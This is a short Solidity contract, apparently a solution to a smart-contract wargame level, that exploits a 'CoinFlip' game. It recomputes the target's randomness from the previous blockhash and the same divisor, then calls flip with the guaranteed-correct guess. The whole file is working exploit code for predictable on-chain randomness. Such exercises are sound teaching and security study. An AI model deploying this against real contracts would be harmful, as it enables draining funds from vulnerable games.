// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface CoinFlip {
      function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
     uint256 lastHash;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     CoinFlip coinFlipContract;

    constructor (address _coinFlip) {
        coinFlipContract = CoinFlip(_coinFlip);
    }

    function flipHack() external returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return coinFlipContract.flip(side);
    }
}